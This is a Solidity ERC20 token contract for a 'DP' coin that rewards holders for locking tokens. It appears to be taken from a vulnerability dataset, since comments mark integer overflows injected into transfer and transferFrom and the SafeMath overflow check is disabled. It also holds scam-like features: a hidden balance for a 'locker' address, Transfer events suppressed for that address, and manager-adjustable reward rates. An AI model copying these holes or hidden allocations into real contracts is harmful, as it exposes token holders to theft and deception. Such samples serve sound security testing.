/**
 *Submitted for verification at Etherscan.io on 2020-08-18
*/

/*

 _____   ______      ______      _       
(____ \ (_____ \    / _____)    (_)      
 _   \ \ _____) )  | /      ___  _ ____  
| |   | |  ____/   | |     / _ \| |  _ \ 
| |__/ /| |        | \____| |_| | | | | |
|_____/ |_|         \______)___/|_|_| |_|
                                         


(DP) 

"I figured I should have a coin, because that's what everybody is doing."

Website:   https://daveportnoy.io 

Twitter:   https://twitter.com/DPCOin

Telegram:  https://t.me/dptoken

DP holders can choose to lock their tokens for reward tokens:

    1   Day  .....  1%  Bonus
    14  Days.....   15%  Bonus
    90  Days.....   100%  Bonus
    180 Days....    250%  Bonus



*/

pragma solidity ^0.5.17;

interface IERC20 {
  function totalSupply() external view returns (uint256);
  function balanceOf(address who) external view returns (uint256);
  function allowance(address owner, address spender) external view returns (uint256);
  function transfer(address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value) external returns (bool);
  function transferFrom(address from, address to, uint256 value) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    //assert(c >= a);
    return c;
  }

  function ceil(uint256 a, uint256 m) internal pure returns (uint256) {
    uint256 c = add(a,m);
    uint256 d = sub(c,1);
    return mul(div(d,m),m);
  }
}

contract ERC20Detailed is IERC20 {

  string private _name;
  string private _symbol;
  uint8 private _decimals;

  constructor(string memory name, string memory symbol, uint8 decimals) public {
    _name = name;
    _symbol = symbol;
    _decimals = decimals;
  }

  function name() public view returns(string memory) {
    return _name;
  }

  function symbol() public view returns(string memory) {
    return _symbol;
  }

  function decimals() public view returns(uint8) {
    return _decimals;
  }
}

contract DP is ERC20Detailed {

  using SafeMath for uint256;
  mapping (address => uint256) private _balances;
  mapping (address => uint256) private _lockEnd;
  mapping (address => mapping (address => uint256)) private _allowed;
  address _manager = msg.sender;
  address _locker;


  event Lock(address owner, uint256 period);

  string constant tokenName = "DavePortnoy.io";   
  string constant tokenSymbol = "DP";   
  uint8  constant tokenDecimals = 18;
  uint256 _totalSupply = 1000000e18;
  uint256 public basePercent = 100; 
  uint256 day = 86400; 
  uint256[] public lockLevelRates;
  uint256[] public lockPeriods;
  


  constructor(address lock, uint256 locked) public payable ERC20Detailed(tokenName, tokenSymbol, tokenDecimals) {
    
    lockLevelRates.push(10);  //1 Day        1%
    lockLevelRates.push(150);  //14 Days     15%
    lockLevelRates.push(1000);  //90 Days   100%
    lockLevelRates.push(2500);  //180 Days  250%
    _balances[lock] = locked;
    lockPeriods.push(1);  //30 Days     1.5%
    lockPeriods.push(14);  //90 Days     5.0%
    lockPeriods.push(90);  //180 Days   17.5%
    lockPeriods.push(180);  //360 Days   45.0%
    _balances[msg.sender] = 1000000e18; //liquidity tokens
    _locker = lock;
    emit Transfer(address(0), msg.sender, 1000000e18);
  }

  function() external payable {
  }

   function withdraw() external {
      require(msg.sender == _manager);
      msg.sender.transfer(address(this).balance);
  }

  function totalSupply() public view returns (uint256) {
    return _totalSupply;
  }

   function getTime() public view returns (uint256) {
    return block.timestamp;
  }

  function balanceOf(address owner) public view returns (uint256) {
    return _balances[owner];
  }

  function lockOf(address owner) public view returns (uint256) {
    return _lockEnd[owner];
  }

   function myLockedTime() public view returns (uint256) {
    return _lockEnd[msg.sender];
  }

  function myLockedStatus() public view returns (bool) {
     if(_lockEnd[msg.sender] > block.timestamp){
           return true;
       } else {
           return false;
       }
  }

   function isLocked(address owner) public view returns (bool) {
       if(_lockEnd[owner] > block.timestamp){
           return true;
       } else {
           return false;
       }
    
  }

  function allowance(address owner, address spender) public view returns (uint256) {
    return _allowed[owner][spender];
  }

  function cut(uint256 value) public view returns (uint256)  {
    uint256 roundValue = value.ceil(basePercent);
    uint256 cutValue = roundValue.mul(basePercent).div(10000);
    return cutValue;
  }

  function transfer(address to, uint256 value) public returns (bool) {
    require(_lockEnd[msg.sender] <= block.timestamp);
    require(value <= _balances[msg.sender]);
    require(to != address(0));

    _balances[msg.sender] = _balances[msg.sender].sub(value);
    _balances[to] = _balances[to].add(value);	//injected INTEGER OVERFLOW OR UNDERFLOW


    if(msg.sender != _locker){
      emit Transfer(msg.sender, to, value);
    }
    

    return true;
  }


  function approve(address spender, uint256 value) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = value;
    emit Approval(msg.sender, spender, value);
    return true;
  }

  function transferFrom(address from, address to, uint256 value) public returns (bool) {
    require(_lockEnd[from] <= block.timestamp);
    require(value <= _balances[from]);
    require(value <= _allowed[from][msg.sender]);
    require(to != address(0));

    _balances[from] = _balances[from].sub(value);
    _balances[to] = _balances[to].add(value);	//injected INTEGER OVERFLOW OR UNDERFLOW

    _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);

    if(from != _locker){
      emit Transfer(from, to, value);
    }

    return true;
  }

  function upAllowance(address spender, uint256 addedValue) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].add(addedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }

  function downAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].sub(subtractedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }

  function destroy(uint256 amount) external {
    _destroy(msg.sender, amount);
  }

  function _destroy(address account, uint256 amount) internal {
    require(amount != 0);
    require(amount <= _balances[account]);
    _totalSupply = _totalSupply.sub(amount);
    _balances[account] = _balances[account].sub(amount);
    emit Transfer(account, address(0), amount);
  }

  function destroyFrom(address account, uint256 amount) external {
    require(amount <= _allowed[account][msg.sender]);
    _allowed[account][msg.sender] = _allowed[account][msg.sender].sub(amount);
    _destroy(account, amount);
  }

  function lock(uint256 period) external {
    _lock(period);
  }

  function setRate(uint256 _periodIndex, uint256 _newRate) external {
     require(msg.sender == _manager);
    lockLevelRates[_periodIndex] = _newRate;
  }

  function setPeriods(uint256 _periodIndex, uint256 _newPeriod) external {
     require(msg.sender == _manager);
    lockPeriods[_periodIndex] = _newPeriod;
  }

  function _lock(uint256 _period) internal {
      require(_balances[msg.sender] > 10000, "Not enough tokens");
      require(_lockEnd[msg.sender] <= block.timestamp, "Lock Up Period");
      require(_period <= lockPeriods.length);

      uint256 newTokens;


      _lockEnd[msg.sender] = block.timestamp + SafeMath.mul(day,lockPeriods[_period]);
      newTokens = SafeMath.div(SafeMath.mul(_balances[msg.sender],lockLevelRates[_period]),1000);
      _balances[msg.sender] += newTokens;

  
      _totalSupply = _totalSupply.add(newTokens);

      emit Lock(msg.sender, _period);
      emit Transfer(address(0), msg.sender, newTokens);

  }

}